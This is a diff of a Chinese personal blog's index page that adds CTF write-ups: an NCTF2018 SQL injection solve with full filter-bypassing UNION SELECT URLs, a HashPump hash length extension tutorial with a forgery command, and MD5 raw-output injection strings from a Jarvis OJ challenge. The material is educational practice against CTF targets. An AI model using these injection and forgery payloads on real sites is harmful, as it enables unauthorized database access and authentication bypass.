@@ -234,136 +234,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/Jarvis-OJ-Web题部分记录 /">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Da Wang">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/1.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Da wang">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/26/Jarvis-OJ-Web题部分记录 /" itemprop="url">未命名</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-26T19:44:34+08:00">
-                2018-11-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>刚开始的时候只有一个输入框，以为是注入题，后来什么都注不出来，看了看响应头，发现这句话。</p>
-<p><img src="/2018/11/26/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/6.png" alt=""></p>
-<p><img src="/2018/11/26/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/7.png" alt=""></p>
-<p>MD5（$pass,true）是啥呢？大佬博客中有详细讲解。<br><code>https://blog.csdn.net/March97/article/details/81222922</code></p>
-<p><img src="/2018/11/26/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/8.png" alt=""></p>
-<p>提供两个payload：<br>content: 129581926211651571912466741651878684928<br>hex: 06da5430449f8f6f23dfc1276f722738<br>raw: ?T0D??o#??’or’8.N=?<br>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: ‘or’6蒥欓!r,b </p>
-<p><img src="/2018/11/26/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/9.png" alt=""><br></p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/11/26/Jarvis-OJ-Web题部分记录 /#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-   
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/hash长度扩展攻击利用工具——HashPump/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -559,6 +429,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -588,7 +480,181 @@
       
         
           
+            <h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>打开长这样……</p>
+<p><img src="/2018/11/25/NCTF2018/签到题.png" alt="签到题"></p>
+<p>开始没思路 ，不知道咋整。后来发现是302跳转。<br>在跳往secret.php之前其实是先跳到20002端口的。由于跳的太快，不易发现。<br>可以用bp截包。然后得到：</p>
+<p><img src="/2018/11/25/NCTF2018/签到.png" alt="主页面"></p>
+<h1 id="晨跑"><a href="#晨跑" class="headerlink" title="晨跑"></a>晨跑</h1><p>这题打开是这样：</p>
+<p><img src="/2018/11/25/NCTF2018/主页面.png" alt="主页面"></p>
+<p>输入’发现是sql注入。</p>
+<p>然后经过测试</p>
+<p>过滤了空格  用%a0代替<br>过滤了-  可以不用<br>过滤了注释 用 and ‘1’=’1代替</p>
+<p>注入步骤如下：</p>
+<p>首先注出数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=34253647%27%a0union%a0select%a01,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),3%a0and%a0%271%27=%271</span><br></pre></td></tr></table></figure></p>
+<p><code>information_schema,cgctf,flaaaaaaag,mysql,performance_schema</code></p>
+<p><img src="/2018/11/25/NCTF2018/数据库.png" alt="主页面"></p>
+<p>再注出表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=34253647%27%a0union%a0select%a01,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=&apos;flaaaaaaag&apos;),3%a0and%a0%271%27=%271</span><br></pre></td></tr></table></figure></p>
+<p><code>f144444444g</code></p>
+<p><img src="/2018/11/25/NCTF2018/表.png" alt="主页面"></p>
+<p>注字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=34253647%27%a0union%a0select%a01,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&apos;f144444444g&apos;),3%a0and%a0%271%27=%271</span><br></pre></td></tr></table></figure></p>
+<p><code>th1s_1s_flag</code></p>
+<p><img src="/2018/11/25/NCTF2018/字段名.png" alt="主页面"></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=34253647%27%a0union%a0select%a01,(select%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),3%a0and%a0%271%27=%271</span><br></pre></td></tr></table></figure></p>
+<p><code>nctf{this_1s_paocao_sqllllll}</code><br><img src="/2018/11/25/NCTF2018/得flag.png" alt="主页面"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+   
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/24/hash长度扩展攻击利用工具——HashPump(1)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da Wang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da wang">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/24/hash长度扩展攻击利用工具——HashPump(1)/" itemprop="url">hash长度扩展攻击利用工具——HashPump</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
             
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-24T19:38:29+08:00">
+                2018-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。</p>
+<p>如果一个应用程序是这样操作的：</p>
+<p>准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）<br>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文<br>服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</p>
+<p>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值。</p>
+<h1 id="HashPump安装"><a href="#HashPump安装" class="headerlink" title="HashPump安装"></a>HashPump安装</h1><p>HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响，因其部分避免了对状态变量的输出，并不输出全部的状态变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<p>若想在python里实现hashpump，可以使用hashpumpy这个插件：</p>
+<p><code>pip install hashpumpy</code></p>
+<p>在linux里使用，使用方法可以这样获取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python</span><br><span class="line">&gt;&gt;&gt; import hashpumpy</span><br><span class="line">&gt;&gt;&gt; help(hashpumpy.hashpump)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># hashpump</span><br><span class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0</span><br><span class="line">Input Data:;&quot;tseug&quot;:5:s              </span><br><span class="line">Input Key Length: 12(盐的长度)</span><br><span class="line">Input Data to Add:;&quot;nimda&quot;:5:s</span><br></pre></td></tr></table></figure>
+<p>或者直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s 3a4727d57463f122833d9e732f94e4e0 -d ;&quot;tseug&quot;:5:s  -k 12 -a ;&quot;nimda&quot;:5:s</span><br></pre></td></tr></table></figure></p>
+<p>示例参见我的另一篇博客 hash长度扩展攻击</p>
+
           
         
       
@@ -736,6 +802,158 @@
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/11/23/hash长度拓展攻击/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+   
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/Jarvis-OJ-Web题部分记录 /">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da Wang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da wang">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/21/Jarvis-OJ-Web题部分记录 /" itemprop="url">Jarvis OJ  Web题部分记录</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T20:14:59+08:00">
+                2018-11-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>刚开始的时候只有一个输入框，以为是注入题，后来什么都注不出来，看了看响应头，发现这句话。</p>
+<p><img src="/2018/11/21/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/6.png" alt=""></p>
+<p><img src="/2018/11/21/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/7.png" alt=""></p>
+<p>MD5（$pass,true）是啥呢？大佬博客中有详细讲解。<br><code>https://blog.csdn.net/March97/article/details/81222922</code></p>
+<p><img src="/2018/11/21/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/8.png" alt=""></p>
+<p>提供两个payload：<br>content: 129581926211651571912466741651878684928<br>hex: 06da5430449f8f6f23dfc1276f722738<br>raw: ?T0D??o#??’or’8.N=?<br>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: ‘or’6蒥欓!r,b </p>
+<p><img src="/2018/11/21/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/9.png" alt=""><br></p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/11/21/Jarvis-OJ-Web题部分记录 /#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1560,7 +1778,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1632,7 +1850,7 @@
   
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共6.7k字</span>
+  <span class="post-count">博客全站共7.4k字</span>
 </div>
 </div>
 
